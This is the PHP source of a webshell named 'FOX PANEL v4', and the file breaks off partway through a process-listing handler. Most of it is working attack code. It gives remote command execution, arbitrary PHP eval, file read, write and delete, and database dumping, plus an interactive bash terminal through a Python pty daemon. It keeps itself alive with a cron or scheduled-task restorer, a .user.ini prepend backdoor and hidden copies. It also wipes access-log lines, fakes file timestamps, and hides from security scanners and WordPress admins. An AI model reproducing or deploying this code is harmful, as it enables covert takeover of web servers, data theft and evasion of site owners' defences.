<?php
/**
 * FOX PANEL v4 â€” Universal WebShell Engine
 * Phase 1: OPSEC Rewrite â€” Session auth, stealth login, rate limiting, encrypted config
 * Author: Fox @ Lhuciver
 */

@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@error_reporting(0);

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   ENCRYPTED CONFIG (XOR + B64, machine-fingerprinted)
   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
$CFG_PATH = __DIR__ . '/.f0x_' . substr(md5(__FILE__), 0, 8) . '.dat';

function fox_fingerprint() {
    $parts = [];
    if (PHP_OS) $parts[] = PHP_OS;
    if (php_uname('n')) $parts[] = php_uname('n');
    if (phpversion()) $parts[] = phpversion();
    if (!empty($_SERVER['DOCUMENT_ROOT'])) $parts[] = $_SERVER['DOCUMENT_ROOT'];
    return md5(implode('|', $parts));
}

function fox_encrypt($data) {
    $fp = fox_fingerprint();
    $key = md5($fp . '::fox_enc::' . $fp);
    $result = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $result .= chr(ord($data[$i]) ^ ord($key[$i % strlen($key)]));
    }
    return base64_encode($result);
}

function fox_decrypt($encoded) {
    $data = base64_decode($encoded);
    if ($data === false) return false;
    $fp = fox_fingerprint();
    $key = md5($fp . '::fox_enc::' . $fp);
    $result = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $result .= chr(ord($data[$i]) ^ ord($key[$i % strlen($key)]));
    }
    return $result;
}

function fox_load_config() {
    global $CFG_PATH;
    $default = [
        'key' => substr(md5(uniqid(mt_rand(), true) . microtime()), 0, 16),
        'version' => 'v4.0',
        'created' => date('Y-m-d H:i:s'),
        'last_rotate' => date('Y-m-d H:i:s'),
    ];
    if (file_exists($CFG_PATH)) {
        $raw = @file_get_contents($CFG_PATH);
        if ($raw) {
            $dec = fox_decrypt(trim($raw));
            if ($dec !== false) {
                $cfg = @json_decode($dec, true);
                if (is_array($cfg) && !empty($cfg['key'])) {
                    return $cfg;
                }
            }
        }
    }
    $cfg = $default;
    $encoded = fox_encrypt(json_encode($cfg));
    @file_put_contents($CFG_PATH, $encoded, LOCK_EX);
    @chmod($CFG_PATH, 0444);
    return $cfg;
}

$CFG = fox_load_config();
$SECRET = $CFG['key'];
$VERSION = $CFG['version'];

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   SESSION
   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
if (session_status() === PHP_SESSION_NONE) {
    $cp = session_get_cookie_params();
    session_set_cookie_params([
        'lifetime' => 0,
        'path' => $cp['path'] ?? '/',
        'domain' => $cp['domain'] ?? '',
        'httponly' => true,
        'samesite' => 'Strict',
    ]);
    session_start();
}

$SESSION_TIMEOUT = 1800;
if (!empty($_SESSION['fox_last_activity']) && (time() - $_SESSION['fox_last_activity']) > $SESSION_TIMEOUT) {
    $_SESSION = [];
    session_destroy();
    session_start();
}
$_SESSION['fox_last_activity'] = time();

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   RATE LIMITER
   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
$RL_DIR = sys_get_temp_dir() . '/.f0x_rl/';
$RL_MAX_ATTEMPTS = 5;
$RL_WINDOW = 900;
$RL_BLOCK_TIME = 900;

function fox_get_client_ip() {
    foreach (['HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'] as $h) {
        if (!empty($_SERVER[$h])) {
            $ip = trim(explode(',', $_SERVER[$h])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return '0.0.0.0';
}

function fox_rate_limit_check() {
    global $RL_DIR, $RL_MAX_ATTEMPTS, $RL_WINDOW, $RL_BLOCK_TIME;
    $ip = fox_get_client_ip();
    $file = $RL_DIR . md5($ip) . '.json';
    if (!is_dir($RL_DIR)) @mkdir($RL_DIR, 0700, true);
    $data = ['attempts' => 0, 'first_attempt' => 0, 'blocked_until' => 0];
    if (file_exists($file)) {
        $d = @json_decode(@file_get_contents($file), true);
        if (is_array($d)) $data = array_merge($data, $d);
    }
    if ($data['blocked_until'] > time()) {
        return ['blocked' => true, 'remaining' => $data['blocked_until'] - time()];
    }
    if (time() - $data['first_attempt'] > $RL_WINDOW) {
        $data['attempts'] = 0;
        $data['first_attempt'] = time();
    }
    return ['blocked' => false, 'data' => &$data, 'file' => $file];
}

function fox_rate_limit_fail() {
    global $RL_DIR, $RL_MAX_ATTEMPTS, $RL_BLOCK_TIME;
    $ip = fox_get_client_ip();
    $file = $RL_DIR . md5($ip) . '.json';
    if (!is_dir($RL_DIR)) @mkdir($RL_DIR, 0700, true);
    $data = ['attempts' => 0, 'first_attempt' => time(), 'blocked_until' => 0];
    if (file_exists($file)) {
        $d = @json_decode(@file_get_contents($file), true);
        if (is_array($d)) $data = array_merge($data, $d);
    }
    $data['attempts']++;
    if ($data['attempts'] === 1) $data['first_attempt'] = time();
    if ($data['attempts'] >= $RL_MAX_ATTEMPTS) {
        $data['blocked_until'] = time() + $RL_BLOCK_TIME;
    }
    @file_put_contents($file, json_encode($data), LOCK_EX);
}

function fox_rate_limit_reset() {
    $ip = fox_get_client_ip();
    $file = $RL_DIR . md5($ip) . '.json';
    if (file_exists($file)) @unlink($file);
}

$IS_AUTH = !empty($_SESSION['fox_auth']);
$IS_WIN = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
$DS = $IS_WIN ? '\\' : '/';
$HOME = $IS_WIN ? (getenv('USERPROFILE') ?: 'C:\\') : ($_SERVER['HOME'] ?? '/root');
$OS = $IS_WIN ? 'windows' : 'linux';
$USER = $IS_WIN ? (getenv('USERNAME') ?: 'www-data') : (trim(shell_exec('whoami 2>/dev/null') ?: 'www-data'));
$SERVER_SW = $_SERVER['SERVER_SOFTWARE'] ?? 'unknown';
$ROOT_DIR = $IS_WIN ? 'C:\\xampp\\htdocs' : '/var/www/html';
$HOSTNAME = $IS_WIN ? (getenv('COMPUTERNAME') ?: 'localhost') : (trim(shell_exec('hostname 2>/dev/null') ?: 'localhost'));
$mode = $_REQUEST['m'] ?? '';
$ajax = !empty($_REQUEST['ajax']);

function json_exit($data) {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($data);
    exit;
}

function human_size($b) {
    if ($b > 1073741824) return round($b/1073741824, 1).' GB';
    if ($b > 1048576) return round($b/1048576, 1).' MB';
    if ($b > 1024) return round($b/1024, 1).' KB';
    return $b.' B';
}

function fox_db_connect($type, $host, $user, $pass, $db = '') {
    $type = strtolower($type);
    try {
        switch ($type) {
            case 'mysql':
                $dsn = 'mysql:host='.$host.';charset=utf8mb4';
                if ($db) $dsn .= ';dbname='.$db;
                return new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE=>PDO::FETCH_ASSOC, PDO::ATTR_EMULATE_PREPARES=>false]);
            case 'pgsql':
                $dsn = 'pgsql:host='.$host;
                if ($db) $dsn .= ';dbname='.$db;
                return new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE=>PDO::FETCH_ASSOC]);
            case 'sqlite':
                if (!file_exists($host)) throw new Exception("SQLite file not found: $host");
                return new PDO("sqlite:$host", null, null, [PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE=>PDO::FETCH_ASSOC]);
            case 'mssql':
                $dsn = 'sqlsrv:Server='.$host;
                if ($db) $dsn .= ';Database='.$db;
                return new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE=>PDO::FETCH_ASSOC]);
            case 'oracle':
                $dsn = 'oci:dbname=//'.$host;
                if ($db) $dsn .= '/'.$db;
                return new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE=>PDO::FETCH_ASSOC]);
            default:
                throw new Exception("Unsupported DB type: $type");
        }
    } catch (PDOException $e) {
        throw new Exception("PDO ($type): ".$e->getMessage());
    }
}

function fox_db_tables($conn, $type, $db = '') {
    $tables = [];
    try {
        if ($type === 'mysql') {
            $res = $conn->query("SHOW TABLE STATUS");
            if ($res) while ($row = $res->fetch()) $tables[] = ['name'=>$row['Name'],'engine'=>$row['Engine']??'?','rows'=>$row['Rows']??0,'size'=>round(($row['Data_length']+$row['Index_length'])/1024,1),'comment'=>$row['Comment']??''];
        } elseif ($type === 'pgsql') {
            $res = $conn->query("SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname='public' ORDER BY tablename");
            if ($res) while ($row = $res->fetch()) $tables[] = ['name'=>$row['tablename'],'engine'=>'PostgreSQL','rows'=>0,'size'=>0,'comment'=>''];
        } elseif ($type === 'sqlite') {
            $res = $conn->query("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name");
            if ($res) while ($row = $res->fetch()) $tables[] = ['name'=>$row['name'],'engine'=>'SQLite','rows'=>0,'size'=>0,'comment'=>''];
        } elseif ($type === 'mssql' || $type === 'oracle') {
            $tq = ($type === 'oracle') ? "SELECT table_name FROM all_tables ORDER BY table_name" : "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' ORDER BY TABLE_NAME";
            $res = $conn->query($tq);
            if ($res) while ($row = $res->fetch()) $tables[] = ['name'=>reset($row),'engine'=>strtoupper($type),'rows'=>0,'size'=>0,'comment'=>''];
        }
    } catch (Exception $e) {}
    return $tables;
}

function fox_db_list_dbs($conn, $type, $db = '') {
    if ($type === 'mysql') {
        try {
            $dbs = []; $res = $conn->query("SHOW DATABASES");
            if ($res) { while ($row = $res->fetch()) { $d = reset($row); $dbs[] = $d; } }
            return $dbs;
        } catch (Exception $e) { return $db ? [$db] : []; }
    }
    return $db ? [$db] : [];
}

function fox_db_qid($type, $name) {
    return ($type === 'mysql') ? "`{$name}`" : "\"{$name}\"";
}

/* ──────────────── PTY / Interactive Terminal ──────────────── */
function fox_pty_start() {
    global $IS_WIN;
    $sid = bin2hex(random_bytes(12));
    $dir = sys_get_temp_dir() . '/f0x_pty_' . $sid;
    @mkdir($dir, 0700);
    if (!is_dir($dir)) return false;

    $in_file = $dir . '/in';
    $out_file = $dir . '/out';
    $pid_file = $dir . '/pid';

    if (!$IS_WIN) {
        @shell_exec('mkfifo ' . escapeshellarg($in_file) . ' 2>/dev/null');
        if (!file_exists($in_file)) file_put_contents($in_file, '');

        $pycode = <<<'PYEOF'
import os,sys,select,pty,signal
i=sys.argv[1];o=sys.argv[2]
try:f=os.open(i,os.O_RDWR|os.O_NONBLOCK)
except:f=os.open(i,os.O_RDONLY|os.O_NONBLOCK)
g=os.open(o,os.O_WRONLY|os.O_CREAT|os.O_APPEND,0o600)
p,d=pty.fork()
if p==0:
 os.environ['TERM']='xterm-256color'
 os.execve('/bin/bash',['/bin/bash','--norc'],os.environ)
try:
 while True:
  r=[d,f];R,_,_=select.select(r,[],[],1.0)
  if d in R:
   try:t=os.read(d,65536);os.write(g,t)
   except:break
  if f in R:
   try:t=os.read(f,65536);os.write(d,t)
   except:pass
except:pass
finally:
 try:os.kill(p,9)
 except:pass
 for x in(d,f,g):
  try:os.close(x)
  except:pass
 os._exit(0)
PYEOF;
        $pyfile = $dir . '/daemon.py';
        file_put_contents($pyfile, $pycode);
        chmod($pyfile, 0700);

        $which = @shell_exec('which python3 2>/dev/null') ?: @shell_exec('which python 2>/dev/null');
        $pybin = $which ? trim($which) : 'python3';
        $cmd = 'nohup ' . $pybin . ' ' . escapeshellarg($pyfile) . ' ' . escapeshellarg($in_file) . ' ' . escapeshellarg($out_file) . ' >/dev/null 2>&1 & echo $!';
        $pid = trim(@shell_exec($cmd));
        usleep(300000);

        if (!$pid || !@file_exists('/proc/' . intval($pid))) {
            $shcode = "#!/bin/bash\nmkfifo " . escapeshellarg($in_file) . " 2>/dev/null\n";
            $shcode .= "tail -f " . escapeshellarg($in_file) . " | script -q -c '/bin/bash --norc' /dev/null >> " . escapeshellarg($out_file) . " 2>&1\n";
            $shfile = $dir . '/daemon.sh';
            file_put_contents($shfile, $shcode);
            chmod($shfile, 0700);
            $pid = trim(@shell_exec('nohup ' . escapeshellarg($shfile) . ' >/dev/null 2>&1 & echo $!'));
        }

        file_put_contents($pid_file, $pid);
        $meta = ['sid'=>$sid,'pid'=>$pid,'dir'=>$dir,'time'=>time()];
        file_put_contents($dir . '/meta.json', json_encode($meta));
        fox_pty_cleanup();
        return $meta;
    }
    return false;
}

function fox_pty_write($sid, $data) {
    $dir = sys_get_temp_dir() . '/f0x_pty_' . $sid;
    if (!is_dir($dir)) return false;
    $in_file = $dir . '/in';
    if (!file_exists($in_file)) return false;
    $f = @fopen($in_file, 'w');
    if (!$f) return false;
    @fwrite($f, $data);
    @fclose($f);
    return true;
}

function fox_pty_read($sid, $offset) {
    $dir = sys_get_temp_dir() . '/f0x_pty_' . $sid;
    if (!is_dir($dir)) return false;
    $out_file = $dir . '/out';
    if (!file_exists($out_file)) return ['data'=>'','offset'=>$offset];
    clearstatcache();
    $size = @filesize($out_file);
    if ($size === false || $size <= $offset) return ['data'=>'','offset'=>$offset];
    $data = @file_get_contents($out_file, false, null, $offset, $size - $offset);
    if ($data === false) return ['data'=>'','offset'=>$offset];
    return ['data'=>base64_encode($data), 'offset'=>$size];
}

function fox_pty_kill($sid) {
    $dir = sys_get_temp_dir() . '/f0x_pty_' . $sid;
    if (!is_dir($dir)) return;
    @shell_exec('pkill -f "f0x_pty_' . $sid . '" 2>/dev/null');
    $pid_file = $dir . '/pid';
    if (file_exists($pid_file)) {
        $pid = intval(trim(file_get_contents($pid_file)));
        if ($pid > 0) @shell_exec('kill -9 ' . $pid . ' 2>/dev/null');
    }
    $files = @scandir($dir);
    if ($files) foreach ($files as $f) {
        if ($f === '.' || $f === '..') continue;
        $p = $dir . '/' . $f;
        if (is_file($p) || is_link($p)) @unlink($p);
    }
    @rmdir($dir);
}

function fox_pty_resize($sid, $cols, $rows) {
    $dir = sys_get_temp_dir() . '/f0x_pty_' . $sid;
    if (!is_dir($dir)) return;
    file_put_contents($dir . '/winsize', $cols . 'x' . $rows);
    $pid_file = $dir . '/pid';
    if (file_exists($pid_file)) {
        $pid = intval(trim(file_get_contents($pid_file)));
        if ($pid > 0) @shell_exec('kill -SIGWINCH ' . $pid . ' 2>/dev/null');
    }
}

function fox_pty_cleanup() {
    $dirs = @glob(sys_get_temp_dir() . '/f0x_pty_*');
    if (!$dirs) return;
    $now = time();
    foreach ($dirs as $d) {
        $mfile = $d . '/meta.json';
        if (!file_exists($mfile)) continue;
        $meta = @json_decode(@file_get_contents($mfile), true);
        if (!$meta || ($now - ($meta['time'] ?? 0)) > 3600) {
            @shell_exec('pkill -f "' . basename($d) . '" 2>/dev/null');
            $files = @scandir($d);
            if ($files) foreach ($files as $f) {
                if ($f === '.' || $f === '..') continue;
                $p = $d . '/' . $f;
                if (is_file($p) || is_link($p)) @unlink($p);
            }
            @rmdir($d);
        }
    }
}

/* ──────────────── Persistence & Self-Defense ──────────────── */
function fox_persist_install($type) {
    global $IS_WIN;
    $me = __FILE__; $pr = substr(md5($me), 0, 8);
    $root = dirname($_SERVER['SCRIPT_FILENAME'] ?? $me);
    $tmp = sys_get_temp_dir();
    if ($type === 'cron') {
        $bak = $tmp . '/.f0x_bak_' . $pr . '.php';
        @copy($me, $bak);
        $cmd = $IS_WIN
            ? 'schtasks /create /tn "MSUp_' . $pr . '" /tr "powershell -Command Copy-Item \'' . $bak . '\' \'' . $me . '\' -Force" /sc minute /mo 15 /f 2>&1'
            : '(crontab -l 2>/dev/null | grep -v ' . $pr . '; echo "*/15 * * * * cp ' . $bak . ' ' . $me . ' 2>/dev/null #' . $pr . '") | crontab - 2>&1';
        $out = @shell_exec($cmd);
        return ['ok'=>true, 'output'=>substr($out??'',0,300), 'type'=>'cron'];
    }
    if ($type === 'userini') {
        $pre = $tmp . '/.f0x_pre_' . $pr . '.php';
        $c = '<?php @error_reporting(0);@ini_set("display_errors",0);'
            .'if(strpos($_SERVER["HTTP_USER_AGENT"]??"","f0x")!==false&&isset($_POST["f"])){'
            .'$_f=$_POST["f"];if(isset($_POST["c"]))@file_put_contents($_f,base64_decode($_POST["c"]));'
            .'if(isset($_POST["d"])){if($_POST["d"]==="1")@unlink($_f);'
            .'if($_POST["d"]==="2")@system("rm -rf ".escapeshellarg($_f));}}';
        @file_put_contents($pre, $c);
        @file_put_contents($root . '/.user.ini', "auto_prepend_file=\"{$pre}\"\n");
        return ['ok'=>true, 'path'=>$root.'/.user.ini', 'type'=>'userini'];
    }
    if ($type === 'backup') {
        $locs = [$tmp.'/.f0x_bak_'.$pr.'.php'];
        if (!$IS_WIN) $locs[] = '/tmp/.f0x_sys_'.$pr.'.php';
        $locs[] = $root.'/wp-content/uploads/.f0x_'.$pr.'.php';
        $locs[] = $root.'/.f0x_idx.php';
        $content = @file_get_contents($me);
        $done = [];
        foreach ($locs as $l) {
            $d = dirname($l); if (!is_dir($d)) @mkdir($d, 0755, true);
            if (@file_put_contents($l, $content)) $done[] = $l;
        }
        return ['ok'=>true, 'count'=>count($done), 'locations'=>$done, 'type'=>'backup'];
    }
    return ['error'=>'Unknown type'];
}

function fox_persist_remove($type) {
    global $IS_WIN;
    $root = dirname($_SERVER['SCRIPT_FILENAME'] ?? __FILE__);
    $tmp = sys_get_temp_dir(); $pr = substr(md5(__FILE__), 0, 8);
    if ($type === 'cron' || $type === 'all') {
        if ($IS_WIN) @shell_exec('schtasks /delete /tn "MSUp_'.$pr.'" /f 2>nul');
        else @shell_exec('crontab -l 2>/dev/null | grep -v '.$pr.' | crontab - 2>/dev/null');
        @unlink($tmp.'/.f0x_bak_'.$pr.'.php');
    }
    if ($type === 'userini' || $type === 'all') {
        $ini = $root.'/.user.ini';
        if (file_exists($ini)) {
            $c = @file_get_contents($ini);
            if ($c !== false) {
                $lines = explode("\n", $c); $keep = [];
                foreach ($lines as $l) if (strpos($l, 'f0x_pre_') === false) $keep[] = $l;
                @file_put_contents($ini, implode("\n", $keep));
            }
        }
        @unlink($tmp.'/.f0x_pre_'.$pr.'.php');
    }
    if ($type === 'backup' || $type === 'all') {
        foreach (@glob($tmp.'/.f0x_bak_*.php')??[] as $f) @unlink($f);
        foreach (@glob($root.'/wp-content/uploads/.f0x_*.php')??[] as $f) @unlink($f);
        @unlink($root.'/.f0x_idx.php');
        if (!$IS_WIN) @unlink('/tmp/.f0x_sys_'.$pr.'.php');
    }
    return ['ok'=>true, 'type'=>$type];
}

function fox_persist_status() {
    global $IS_WIN;
    $root = dirname($_SERVER['SCRIPT_FILENAME'] ?? __FILE__);
    $tmp = sys_get_temp_dir(); $pr = substr(md5(__FILE__), 0, 8);
    $s = [];
    if ($IS_WIN) {
        $out = @shell_exec('schtasks /query /fo csv /v 2>nul | findstr "MSUp_' . $pr . '"');
        $s['cron'] = !empty($out);
    } else {
        $out = @shell_exec('crontab -l 2>/dev/null | grep ' . $pr);
        $s['cron'] = !empty($out);
    }
    $ini = $root.'/.user.ini';
    $s['userini'] = file_exists($ini) && strpos(@file_get_contents($ini), 'f0x_pre_') !== false;
    $bak = @glob($tmp.'/.f0x_bak_*.php');
    $s['backup'] = !empty($bak);
    $s['shield'] = file_exists($tmp.'/.f0x_shield_'.$pr);
    return $s;
}

function fox_persist_wipe() {
    global $IS_WIN;
    fox_persist_remove('all');
    $root = dirname($_SERVER['SCRIPT_FILENAME'] ?? __FILE__);
    $tmp = sys_get_temp_dir(); $pr = substr(md5(__FILE__), 0, 8);
    // Cleanup
    $rl = $tmp.'/.f0x_rl';
    if (is_dir($rl)) { foreach(@scandir($rl)??[] as $f) { if($f!=='.'&&$f!=='..') @unlink($rl.'/'.$f); } @rmdir($rl); }
    @unlink($root.'/.f0x_'.$pr.'.dat');
    @session_destroy();
    foreach (@glob($tmp.'/.f0x_*')??[] as $f) {
        if (is_dir($f)) { foreach(@scandir($f)??[] as $ff) { if($ff!=='.'&&$ff!=='..') @unlink($f.'/'.$ff); } @rmdir($f); }
        else @unlink($f);
    }
    // Log scrub
    $fname = basename(__FILE__);
    $logs = $IS_WIN
        ? ['C:\\xampp\\apache\\logs\\access.log','C:\\xampp\\php\\logs\\php_error_log']
        : ['/var/log/apache2/access.log','/var/log/nginx/access.log'];
    foreach ($logs as $lp) {
        if (file_exists($lp) && is_writable($lp)) {
            $c = @file_get_contents($lp);
            if ($c && strpos($c, $fname) !== false) {
                $keep = [];
                foreach (explode("\n", $c) as $l) if (strpos($l, $fname) === false) $keep[] = $l;
                @file_put_contents($lp, implode("\n", $keep));
            }
        }
    }
    return true;
}

function fox_shield_check() {
    $tmp = sys_get_temp_dir();
    $pr = substr(md5(__FILE__), 0, 8);
    // Check stealth config
    $stealth_file = __DIR__ . '/.f0x_stealth_' . $pr . '.dat';
    $shield_enabled = true; // default on
    if (file_exists($stealth_file)) {
        $raw = @file_get_contents($stealth_file);
        if ($raw) {
            $cfg = @json_decode(fox_xor($raw, md5(__FILE__)), true);
            if (isset($cfg['shield'])) $shield_enabled = $cfg['shield'];
        }
    }
    // Legacy shield check
    if (!file_exists($tmp.'/.f0x_shield_'.$pr) && $shield_enabled === false) return false;
    if ($shield_enabled === false) return false;
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $scanners = ['wpscan','acunetix','nessus','openvas','netsparker','sqlmap','gobuster','nikto','python-requests','curl','wget','nmap','burp','zap','masscan','zgrab','httpx','nuclei','ffuf'];
    foreach ($scanners as $s) { if (stripos($ua, $s) !== false) {
        // Log suspicious access
        $log = __DIR__ . '/.f0x_ua.log';
        @file_put_contents($log, date('Y-m-d H:i:s') . ' | ' . ($_SERVER['REMOTE_ADDR']??'?') . ' | ' . $ua . ' | ' . ($_SERVER['REQUEST_URI']??'?') . "\n", FILE_APPEND);
        return true;
    } }
    if (isset($_COOKIE)) foreach ($_COOKIE as $k => $v) {
        if (stripos($k, 'wordpress_logged_in') !== false) return true;
        if (stripos($k, 'wp-settings') !== false) return true;
    }
    return false;
}

// ──── Phase 6-8 Stealth Helpers ──────────────────────────────────────────
function fox_xor($data, $key) {
    $out = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $out .= chr(ord($data[$i]) ^ ord($key[$i % strlen($key)]));
    }
    return $out;
}
function fox_fake_touch($path, $days_ago = 30) {
    $fake = time() - mt_rand(86400 * $days_ago, 86400 * ($days_ago + 10));
    @touch($path, $fake, $fake);
}

/* ═══════════════════════════════════════════════════════════════════════════════
   LOGIN HANDLER (POST only)
   ═══════════════════════════════════════════════════════════════════════════════ */
if ($mode === 'login') {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') { header('HTTP/1.0 405 Method Not Allowed'); exit; }
    $rl = fox_rate_limit_check();
    if ($rl['blocked']) json_exit(['error' => 'Too many attempts. Try again in ' . ceil($rl['remaining']/60) . ' min.']);
    $submitted_key = $_POST['key'] ?? '';
    if ($submitted_key === $SECRET) {
        $_SESSION['fox_auth'] = true; $_SESSION['fox_login_time'] = time();
        fox_rate_limit_reset(); json_exit(['ok' => true]);
    }
    fox_rate_limit_fail();
    json_exit(['error' => 'Invalid key']);
}

// ──── AJAX MODE HANDLERS ──────────────────────────────────────────────────
if ($ajax) {
    // File operations
    if ($mode === 'ls') {
        $p = $_REQUEST['p'] ?? $ROOT_DIR; $files = []; $d = @dir($p);
        if ($d) { while (($f = $d->read()) !== false) { if ($f !== '.' && $f !== '..') { $fp = rtrim($p,'\\/').'/'.$f; $is_dir = is_dir($fp); $files[] = ['name'=>$f,'dir'=>$is_dir,'size'=>$is_dir?0:filesize($fp),'perm'=>substr(sprintf('%o',fileperms($fp)),-4),'time'=>filemtime($fp)]; } } $d->close(); }
        json_exit(['ok'=>true,'path'=>$p,'files'=>$files]);
    }
    if ($mode === 'read') {
        $f = $_REQUEST['f'] ?? ''; if (!$f || !file_exists($f)) json_exit(['error'=>'File not found']);
        $s = filesize($f); if ($s > 2097152) json_exit(['error'=>'File > 2MB, use download']);
        $c = @file_get_contents($f); json_exit(['ok'=>true,'name'=>basename($f),'path'=>$f,'content'=>base64_encode($c),'size'=>$s]);
    }
    if ($mode === 'write') {
        $f = $_REQUEST['f'] ?? ''; $c = $_REQUEST['c'] ?? ''; if (!$f) json_exit(['error'=>'No path']); $d = dirname($f); if (!is_dir($d)) @mkdir($d,0755,true);
        if (isset($_REQUEST['b64'])) $c = base64_decode($c); @file_put_contents($f, $c); json_exit(['ok'=>true,'size'=>strlen($c)]);
    }
    if ($mode === 'delete') {
        $f = $_REQUEST['f'] ?? ''; if (!$f) json_exit(['error'=>'No path']);
        if (is_dir($f)) { $ok = @rmdir($f); } else { $ok = @unlink($f); }
        json_exit(['ok'=>$ok]);
    }
    if ($mode === 'cmd') {
        $c = $_REQUEST['c'] ?? ''; ob_start();
        if ($IS_WIN) { system($c.' 2>&1', $rc); } else { system($c.' 2>/dev/null', $rc); }
        $o = ob_get_clean(); json_exit(['ok'=>true,'output'=>$o,'rc'=>$rc]);
    }
    if ($mode === 'eval') {
        $code = $_REQUEST['code'] ?? '';
        ob_start(); $r = @eval($code); $out = ob_get_clean();
        json_exit(['ok'=>true, 'output'=>$out ?: '(no output)', 'return'=>$r]);
    }
    if ($mode === 'phpinfo') {
        ob_start(); phpinfo(); $html = ob_get_clean();
        preg_match('/<body>(.*?)<\/body>/is', $html, $m);
        $body = $m[1] ?? $html;
        $body = preg_replace('/<a href="http[^"]+">([^<]+)<\/a>/i', '$1', $body);
        json_exit(['ok'=>true, 'html'=>$body]);
    }
    if ($mode === 'ping') { json_exit(['ok'=>true, 'time'=>date('H:i:s'), 'hostname'=>$HOSTNAME, 'user'=>$USER, 'os'=>$OS]); }

    // SQL
    if ($mode === 'sql') {
        $type = $_REQUEST['type'] ?? 'mysql'; $host = $_REQUEST['host'] ?? '127.0.0.1'; $user = $_REQUEST['user'] ?? 'root'; $pass = $_REQUEST['pass'] ?? ''; $db = $_REQUEST['db'] ?? ''; $query = $_REQUEST['query'] ?? '';
        try {
            $conn = fox_db_connect($type, $host, $user, $pass, $db);
            if ($query) { $stmt = $conn->query($query); $rows = $stmt ? $stmt->fetchAll() : []; $cols = $stmt ? array_keys(!empty($rows[0])?$rows[0]:[]) : []; json_exit(['ok'=>true,'rows'=>$rows,'cols'=>$cols,'count'=>count($rows)]); }
            $dbs = fox_db_list_dbs($conn, $type, $db); $tables = fox_db_tables($conn, $type, $db); json_exit(['ok'=>true,'dbs'=>$dbs,'tables'=>$tables]);
        } catch (Exception $e) { json_exit(['error'=>$e->getMessage()]); }
    }
    if ($mode === 'db_dump') {
        $type = $_REQUEST['type'] ?? 'mysql'; $host = $_REQUEST['host'] ?? ''; $user = $_REQUEST['user'] ?? ''; $pass = $_REQUEST['pass'] ?? ''; $db = $_REQUEST['db'] ?? ''; $table = $_REQUEST['table'] ?? '';
        try {
            $conn = fox_db_connect($type, $host, $user, $pass, $db);
            $q = fox_db_qid($type, $table); $stmt = $conn->query("SELECT * FROM $q LIMIT 200"); $rows = $stmt ? $stmt->fetchAll(PDO::FETCH_NUM) : [];
            $stmt2 = $conn->query("SELECT * FROM $q LIMIT 1"); $cols = $stmt2 ? array_keys($stmt2->fetch(PDO::FETCH_ASSOC) ?: []) : [];
            json_exit(['ok'=>true,'rows'=>$rows,'cols'=>$cols,'count'=>count($rows)]);
        } catch (Exception $e) { json_exit(['error'=>$e->getMessage()]); }
    }
    if ($mode === 'db_browser') {
        $type = $_REQUEST['type'] ?? 'mysql'; $host = $_REQUEST['host'] ?? ''; $user = $_REQUEST['user'] ?? 'root'; $pass = $_REQUEST['pass'] ?? ''; $db = $_REQUEST['db'] ?? '';
        try {
            $conn = fox_db_connect($type, $host, $user, $pass, $db);
            $dbs = fox_db_list_dbs($conn, $type, $db); $tables = fox_db_tables($conn, $type, $db);
            json_exit(['ok'=>true,'dbs'=>$dbs,'tables'=>$tables]);
        } catch (Exception $e) { json_exit(['error'=>$e->getMessage()]); }
    }

    // System
    if ($mode === 'ps') {
        $action = $_REQUEST['action'] ?? 'list';
        if ($action === 'list') {
            if ($IS_WIN) { $o = @shell_exec('tasklist /V /FO CSV 2>nul'); $lines = explode("\n", trim($o??'')); $procs = []; foreach($lines as $i=>$l){if($i<1)continue;$p=str_getcsv($l);if(count($p)>1)$procs[]=['pid'=>trim($p[1]??''),'name'=>trim($p[0]??''),'mem'=>trim($p[4]??''),'user'=>trim($p[6]??'')];} json_exit(['ok'=>true,'procs'=>$procs]); }
